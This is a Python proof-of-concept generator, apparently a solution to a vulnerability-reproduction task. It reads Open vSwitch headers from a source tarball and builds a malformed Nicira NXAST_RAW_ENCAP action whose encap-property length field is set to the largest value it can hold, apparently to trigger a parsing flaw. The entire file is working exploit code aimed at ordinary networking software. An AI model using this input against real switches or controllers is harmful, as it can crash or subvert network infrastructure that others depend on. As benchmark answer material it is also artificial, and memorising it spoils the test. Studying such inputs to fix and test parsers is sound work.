import tarfile
import re
import struct
from typing import List, Dict, Optional


class CField:
    def __init__(self, name: str, ctype: str, offset: int, size: int, array_len: int):
        self.name = name
        self.ctype = ctype
        self.offset = offset
        self.size = size
        self.array_len = array_len


class CStruct:
    def __init__(self, name: str, size: int, fields: List[CField]):
        self.name = name
        self.size = size
        self.fields = fields


class StructParser:
    def __init__(self, all_headers: List[str]):
        # all_headers: list of header file contents as strings
        self.all_headers = all_headers
        self.struct_cache: Dict[str, CStruct] = {}

    def get_struct(self, name: str) -> Optional[CStruct]:
        if name in self.struct_cache:
            return self.struct_cache[name]
        text = self._find_struct_text(name)
        if text is None:
            return None
        struct_def = self._parse_struct(name, text)
        if struct_def is not None:
            self.struct_cache[name] = struct_def
        return struct_def

    def _find_struct_text(self, name: str) -> Optional[str]:
        pattern = re.compile(r"struct\s+" + re.escape(name) + r"\s*{", re.S)
        for header in self.all_headers:
            m = pattern.search(header)
            if m:
                start = m.start()
                rest = header[start:]
                # Find matching closing brace for this struct.
                brace_level = 0
                end_idx = None
                for i, ch in enumerate(rest):
                    if ch == '{':
                        brace_level += 1
                    elif ch == '}':
                        brace_level -= 1
                        if brace_level == 0:
                            end_idx = i
                            break
                if end_idx is None:
                    continue
                return rest[: end_idx + 1]
        return None

    def _strip_comments(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*?$", "", s, flags=re.M)
        return s

    def _parse_struct(self, name: str, text: str) -> Optional[CStruct]:
        text_nc = self._strip_comments(text)
        m = re.search(r"struct\s+" + re.escape(name) + r"\s*{(.*?)}", text_nc, flags=re.S)
        if not m:
            return None
        body = m.group(1)
        # Normalize whitespace
        body = body.replace("\n", " ")
        # Split by ';' to get field declarations.
        decls = [d.strip() for d in body.split(";") if d.strip()]
        fields: List[CField] = []
        offset = 0
        for decl in decls:
            # Skip internal structs/enums/typedefs.
            if decl.startswith("struct ") or decl.startswith("enum ") or decl.startswith("typedef "):
                continue
            # Process commas for multiple declarators.
            sub_decls = [sd.strip() for sd in decl.split(",") if sd.strip()]
            if not sub_decls:
                continue
            base = sub_decls[0]
            parts = base.split()
            if len(parts) < 2:
                continue
            type_tokens = parts[:-1]
            name_token = parts[-1]
            base_type = " ".join([t for t in type_tokens if t not in ("const", "volatile")])
            names = [name_token]
            for sd in sub_decls[1:]:
                names.append(sd)
            for name_tok in names:
                # Remove any pointer asterisks from name.
                name_tok = name_tok.strip()
                name_tok = name_tok.lstrip("*")
                # Extract array length if any.
                m_arr = re.match(r"([A-Za-z_]\w*)\s*(\[(.+)\])?$", name_tok)
                if not m_arr:
                    continue
                field_name = m_arr.group(1)
                arr_len_expr = m_arr.group(3)
                arr_len = 1
                if arr_len_expr:
                    arr_len_expr = arr_len_expr.strip()
                    try:
                        arr_len = int(arr_len_expr, 0)
                    except Exception:
                        # Fallback: if cannot parse, guess 1.
                        arr_len = 1
                elem_size = self._ctype_size(base_type)
                if elem_size is None:
                    continue
                field_size = elem_size * arr_len
                fields.append(CField(field_name, base_type, offset, field_size, arr_len))
                offset += field_size
        return CStruct(name, offset, fields)

    def _ctype_size(self, ctype: str) -> Optional[int]:
        ctype = ctype.strip()
        # Handle "struct NAME"
        if ctype.startswith("struct "):
            sub_name = ctype.split()[1]
            sub = self.get_struct(sub_name)
            if sub is None:
                return None
            return sub.size

        base_map = {
            "uint8_t": 1,
            "int8_t": 1,
            "char": 1,
            "unsigned char": 1,
            "uint16_t": 2,
            "int16_t": 2,
            "uint32_t": 4,
            "int32_t": 4,
            "uint64_t": 8,
            "int64_t": 8,
            "ovs_be16": 2,
            "ovs_be32": 4,
            "ovs_be64": 8,
        }
        if ctype in base_map:
            return base_map[ctype]
        # Types like ovs_be16_t etc.
        m = re.search(r"(\d+)_t$", ctype)
        if m:
            bits = int(m.group(1))
            if bits in (8, 16, 32, 64):
                return bits // 8
        # Heuristic: if contains 16/32/64.
        if "16" in ctype:
            return 2
        if "32" in ctype:
            return 4
        if "64" in ctype:
            return 8
        # Fallback unknown.
        return None


def is_big_endian_type(ctype: str) -> bool:
    ctype = ctype.strip()
    if "ovs_be" in ctype:
        return True
    if "be16" in ctype or "be32" in ctype or "be64" in ctype:
        return True
    return True  # default to big-endian for multi-byte integers


def encode_int(value: int, size: int, be: bool = True) -> bytes:
    if size == 1:
        return struct.pack("B", value & 0xFF)
    if size == 2:
        fmt = "!H" if be else "<H"
        return struct.pack(fmt, value & 0xFFFF)
    if size == 4:
        fmt = "!I" if be else "<I"
        return struct.pack(fmt, value & 0xFFFFFFFF)
    if size == 8:
        fmt = "!Q" if be else "<Q"
        return struct.pack(fmt, value & 0xFFFFFFFFFFFFFFFF)
    # Fallback: pack as big-endian, pad or truncate.
    if size > 8:
        # Only support up to 8; larger we just fit lower bytes.
        data = value.to_bytes(size, "big", signed=False)
        return data
    return b"\x00" * size


def encode_struct(struct_def: CStruct, values: Dict[str, int]) -> bytes:
    buf = bytearray(struct_def.size)
    for field in struct_def.fields:
        base_size = field.size // field.array_len
        off = field.offset
        if field.array_len > 1:
            # If user provided full byte sequence for this array, copy it.
            v = values.get(field.name)
            if isinstance(v, (bytes, bytearray)) and len(v) == field.size:
                buf[off : off + field.size] = v
            else:
                # default zeros
                pass
        else:
            v = values.get(field.name, 0)
            be = is_big_endian_type(field.ctype)
            buf[off : off + base_size] = encode_int(int(v), base_size, be)
    return bytes(buf)


def parse_vendor_id(text: str) -> Optional[int]:
    m = re.search(r"#\s*define\s+NX_VENDOR_ID\s+([0-9xXa-fA-F]+)", text)
    if not m:
        return None
    try:
        return int(m.group(1), 0)
    except Exception:
        return None


def parse_nxast_raw_encap_subtype(text: str) -> Optional[int]:
    # First try direct define.
    m = re.search(r"#\s*define\s+NXAST_RAW_ENCAP\s+([0-9xXa-fA-F]+)", text)
    if m:
        try:
            return int(m.group(1), 0)
        except Exception:
            pass

    # Fallback: parse enum nx_action_subtype.
    m = re.search(r"enum\s+nx_action_subtype\s*{(.*?)}", text, flags=re.S)
    if not m:
        return None
    body = m.group(1)
    # Remove comments.
    body = re.sub(r"/\*.*?\*/", "", body, flags=re.S)
    body = re.sub(r"//.*?$", "", body, flags=re.M)
    enum_items = body.split(",")
    current_val = 0
    first_val_assigned = False
    for raw_item in enum_items:
        item = raw_item.strip()
        if not item:
            continue
        m_item = re.match(r"([A-Za-z_]\w*)\s*(?:=\s*([^,]+))?$", item)
        if not m_item:
            continue
        name = m_item.group(1)
        val_expr = m_item.group(2)
        if val_expr:
            val_expr = val_expr.strip()
            try:
                # Only handle simple integer constants.
                val = int(val_expr, 0)
            except Exception:
                # If cannot parse, just keep current_val.
                val = current_val
            current_val = val
            first_val_assigned = True
        else:
            if not first_val_assigned:
                current_val = 0
                first_val_assigned = True
            else:
                current_val += 1
        if name == "NXAST_RAW_ENCAP":
            return current_val
    return None


def parse_ed_prop_len_field(ed_header: CStruct) -> Optional[str]:
    # Find field named like 'len' or 'length'.
    for f in ed_header.fields:
        lname = f.name.lower()
        if "len" == lname or lname.endswith("len") or "length" in lname:
            return f.name
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default fallbacks if parsing fails.
        fallback_vendor_id = 0x00002320
        fallback_subtype = 0xFFFF  # unlikely real, but placeholder

        nicira_texts: List[str] = []
        ed_texts: List[str] = []

        # Collect relevant headers.
        with tarfile.open(src_path, "r:*") as tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                if not (member.name.endswith(".h") or member.name.endswith(".hpp") or member.name.endswith(".c")):
                    continue
                f = tf.extractfile(member)
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if ("NXAST_RAW_ENCAP" in text or "nx_action_raw_encap" in text or "NX_VENDOR_ID" in text) and ("nicira" in member.name or "openflow" in member.name or "nx-" in member.name):
                    nicira_texts.append(text)
                if "ofp_ed_prop_header" in text:
                    ed_texts.append(text)

        all_headers = nicira_texts + ed_texts
        if not all_headers:
            all_headers = [""]  # ensure non-empty

        parser = StructParser(all_headers)

        # Parse vendor ID and subtype.
        vendor_id = None
        subtype = None
        for txt in nicira_texts:
            if vendor_id is None:
                vendor_id = parse_vendor_id(txt)
            if subtype is None:
                subtype = parse_nxast_raw_encap_subtype(txt)
        if vendor_id is None:
            vendor_id = fallback_vendor_id
        if subtype is None:
            subtype = fallback_subtype

        # Get nx_action_raw_encap struct definition.
        nx_struct = parser.get_struct("nx_action_raw_encap")
        # If not found, fabricate basic 16-byte header.
        if nx_struct is None:
            # type(2) len(2) vendor(4) subtype(2) pad(6) = 16
            nx_size = 16
            fields = [
                CField("type", "ovs_be16", 0, 2, 1),
                CField("len", "ovs_be16", 2, 2, 1),
                CField("vendor", "ovs_be32", 4, 4, 1),
                CField("subtype", "ovs_be16", 8, 2, 1),
                CField("pad", "uint8_t", 10, 6, 6),
            ]
            nx_struct = CStruct("nx_action_raw_encap", nx_size, fields)

        # Get ofp_ed_prop_header struct.
        ed_header = parser.get_struct("ofp_ed_prop_header")
        if ed_header is None:
            # Fallback: assume simple 4-byte type,len header.
            ed_fields = [
                CField("type", "ovs_be16", 0, 2, 1),
                CField("len", "ovs_be16", 2, 2, 1),
            ]
            ed_header = CStruct("ofp_ed_prop_header", 4, ed_fields)

        len_field_name = parse_ed_prop_len_field(ed_header)
        if len_field_name is None:
            len_field_name = ed_header.fields[-1].name

        # Decide property length.
        len_field = None
        for f in ed_header.fields:
            if f.name == len_field_name:
                len_field = f
                break
        if len_field is None:
            len_field = ed_header.fields[-1]
        len_field_size = len_field.size  # in bytes
        max_len_value = (1 << (8 * len_field_size)) - 1

        # We want property length large, multiple-of-4, and leave room for header size.
        header_size = ed_header.size
        # Choose largest multiple-of-4 <= max_len_value and >= header_size+4.
        prop_len = header_size + 4
        if prop_len % 4 != 0:
            prop_len += 4 - (prop_len % 4)
        if prop_len > max_len_value:
            prop_len = max_len_value & ~3
        # Make it as large as possible while respecting constraints.
        candidate = max_len_value & ~3
        if candidate >= header_size + 4:
            prop_len = candidate

        # Ensure action length (nx_struct.size + prop_len) is multiple of 8.
        base_size = nx_struct.size
        total_len = base_size + prop_len
        rem = total_len % 8
        if rem != 0:
            # Increase prop_len to fix alignment if possible.
            needed = 8 - rem
            if prop_len + needed <= max_len_value:
                prop_len += needed
                total_len += needed
            else:
                # Fallback: shrink a bit while keeping multiple-of-4.
                total_len = (total_len + 7) & ~7

        action_len = total_len

        # Build nx_action_raw_encap base.
        nx_values: Dict[str, int] = {}
        for f in nx_struct.fields:
            lname = f.name.lower()
            if lname == "type":
                nx_values[f.name] = 0xFFFF  # OFPAT_VENDOR / EXPERIMENTER
            elif lname == "len":
                nx_values[f.name] = action_len
            elif "vendor" in lname or "experimenter" in lname:
                nx_values[f.name] = vendor_id
            elif "subtype" in lname:
                nx_values[f.name] = subtype
            else:
                # Other fields: leave as 0 (default).
                pass

        nx_bytes = encode_struct(nx_struct, nx_values)

        # Build ED property header.
        ed_values: Dict[str, int] = {}
        for f in ed_header.fields:
            lname = f.name.lower()
            if f.name == len_field_name:
                ed_values[f.name] = prop_len
            elif "type" == lname or lname.endswith("type"):
                # Set some non-zero type for better chance of being treated as valid.
                ed_values[f.name] = 1
            elif "class" in lname:
                ed_values[f.name] = 1
            else:
                # default 0
                pass
        ed_header_bytes = encode_struct(ed_header, ed_values)
        # Payload zeros.
        payload_len = prop_len - header_size
        if payload_len < 0:
            payload_len = 0
        payload = b"\x00" * payload_len
        prop_bytes = ed_header_bytes + payload

        poc = nx_bytes + prop_bytes
        # Sanity: ensure length matches action_len.
        if len(poc) != action_len:
            # If mismatch (e.g., due to struct size parsing), truncate or pad.
            if len(poc) > action_len:
                poc = poc[:action_len]
            else:
                poc = poc + b"\x00" * (action_len - len(poc))

        return poc